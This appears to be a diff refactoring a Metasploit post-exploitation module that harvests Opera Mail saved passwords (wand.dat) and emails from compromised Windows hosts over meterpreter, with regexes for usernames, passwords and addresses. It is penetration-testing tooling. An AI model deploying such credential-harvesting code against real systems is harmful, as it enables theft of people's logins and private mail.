@@ -9,86 +9,94 @@ class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Windows::UserProfiles
   include Msf::Post::Windows::Packrat
+  ARTIFACTS =
+    {
+      application: 'operamail',
+      app_category: 'emails',
+      gatherable_artifacts: [
+        {
+          filetypes: 'chats_image',
+          path: 'AppData',
+          dir: 'Opera Mail',
+          artifact_file_name: 'wand.dat',
+          description: "Opera-Mail's saved Username and Passwords",
+          credential_type: 'text',
+          regex_search: [
+            {
+              extraction_description: 'Searches for credentials (USERNAMES/PASSWORDS)',
+              extraction_type: 'credentials',
+              regex: [
+                '(?i-mx:password.*)',
+                '(?i-mx:username.*)'
+              ]
+            },
+            {
+              extraction_description: 'searches for Email TO/FROM address',
+              extraction_type: 'Email addresses',
+              regex: [
+                '(?i-mx:to:.*)',
+                '(?i-mx:from:.*)'
+              ]
+            }
+          ]
+        },
+        {
+          filetypes: 'email_logs',
+          path: 'LocalAppData',
+          dir: 'Opera Mail',
+          artifact_file_name: '*.mbs',
+          description: "Opera-Mail's Emails",
+          credential_type: 'text',
+          regex_search: [
+            {
+              extraction_description: 'Searches for credentials (USERNAMES/PASSWORDS)',
+              extraction_type: 'credentials',
+              regex: [
+                '(?i-mx:password.*)',
+                '(?i-mx:username.*)'
+              ]
+            },
+            {
+              extraction_description: 'searches for Email TO/FROM address',
+              extraction_type: 'Email addresses',
+              regex: [
+                '(?i-mx:to:.*)',
+                '(?i-mx:from:.*)'
+              ]
+            }
+          ]
+        }
+      ]
+    }.freeze
 
   def initialize(info = {})
-    super(update_info(info,
-                      'Name' => 'Operamail credential gatherer',
-                      'Description' => %q{
-                      PackRat is a post-exploitation module that gathers file and information artifacts from end users' systems.
-      PackRat searches for and downloads files of interest (such as config files, and received and deleted emails) and extracts information (such as contacts and usernames and passwords), using regexp, JSON, XML, and SQLite queries.
-      Further details can be found in the module documentation.
-      This is a module that searches for Operamail credentials on a windows remote host.
-      },
-                      'License' => MSF_LICENSE,
-                      'Author' =>
-                        [
-                          'Kazuyoshi Maruta',
-                          'Daniel Hallsworth',
-                          'Barwar Salim M',
-                          'Z. Cliffe Schreuders', # http://z.cliffe.schreuders.org
-                        ],
-                      'Platform' => ['win'],
-                      'SessionTypes' => ['meterpreter'],
-                      'artifacts' =>
-                        {
-                          "application": "operamail",
-                          "app_category": "emails",
-                          "gatherable_artifacts": [
-                            {
-                              "filetypes": "chats_image",
-                              "path": "AppData",
-                              "dir": "Opera Mail",
-                              "artifact_file_name": "wand.dat",
-                              "description": "Opera-Mail's saved Username and Passwords",
-                              "credential_type": "text",
-                              "regex_search": [
-                                {
-                                  "extraction_description": "Searches for credentials (USERNAMES/PASSWORDS)",
-                                  "extraction_type": "credentials",
-                                  "regex": [
-                                    "(?i-mx:password.*)",
-                                    "(?i-mx:username.*)"
-                                  ]
-                                },
-                                {
-                                  "extraction_description": "searches for Email TO/FROM address",
-                                  "extraction_type": "Email addresses",
-                                  "regex": [
-                                    "(?i-mx:to:.*)",
-                                    "(?i-mx:from:.*)"
-                                  ]
-                                }
-                              ]
-                            },
-                            {
-                              "filetypes": "email_logs",
-                              "path": "LocalAppData",
-                              "dir": "Opera Mail",
-                              "artifact_file_name": "*.mbs",
-                              "description": "Opera-Mail's Emails",
-                              "credential_type": "text",
-                              "regex_search": [
-                                {
-                                  "extraction_description": "Searches for credentials (USERNAMES/PASSWORDS)",
-                                  "extraction_type": "credentials",
-                                  "regex": [
-                                    "(?i-mx:password.*)",
-                                    "(?i-mx:username.*)"
-                                  ]
-                                },
-                                {
-                                  "extraction_description": "searches for Email TO/FROM address",
-                                  "extraction_type": "Email addresses",
-                                  "regex": [
-                                    "(?i-mx:to:.*)",
-                                    "(?i-mx:from:.*)"
-                                  ]
-                                }
-                              ]
-                            }
-                          ]
-                        }
-          ))
+    super(
+      update_info(
+        info,
+        'Name' => 'Operamail credential gatherer',
+        'Description' => %q{
+          PackRat is a post-exploitation module that gathers file and information artifacts from end users' systems.
+          PackRat searches for and downloads files of interest (such as config files, and received and deleted emails) and extracts information (such as contacts and usernames and passwords), using regexp, JSON, XML, and SQLite queries.
+          Further details can be found in the module documentation.
+          This is a module that searches for Operamail credentials on a windows remote host.
+        },
+        'License' => MSF_LICENSE,
+        'Author' =>
+          [
+            'Kazuyoshi Maruta',
+            'Daniel Hallsworth',
+            'Barwar Salim M',
+            'Z. Cliffe Schreuders', # http://z.cliffe.schreuders.org
+          ],
+        'Platform' => ['win'],
+        'SessionTypes' => ['meterpreter'],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'Reliability' => [],
+          'SideEffects' => []
+        }
+      )
+    )
 
     register_options(
       [
@@ -96,8 +104,9 @@ class MetasploitModule < Msf::Post
         OptBool.new('STORE_LOOT', [false, 'Store artifacts into loot database', true]),
         OptBool.new('EXTRACT_DATA', [false, 'Extract data and stores in a separate file', true]),
         # enumerates the options based on the artifacts that are defined below
-        OptEnum.new('ARTIFACTS', [false, 'Type of artifacts to collect', 'All', module_info['artifacts'][:'gatherable_artifacts'].map { |k| k[:'filetypes'] }.uniq.unshift('All')])
-      ])
+        OptEnum.new('ARTIFACTS', [false, 'Type of artifacts to collect', 'All', module_info['artifacts'][:gatherable_artifacts].map { |k| k[:filetypes] }.uniq.unshift('All')])
+      ]
+    )
   end
 
   def run
@@ -108,11 +117,9 @@ class MetasploitModule < Msf::Post
 
     # used to grab files for each user on the remote host
     grab_user_profiles.each do |userprofile|
-      run_packrat(userprofile, module_info['artifacts'])
-
+      run_packrat(userprofile, ARTIFACTS)
     end
 
     print_status 'PackRat credential sweep Completed'
   end
 end
-
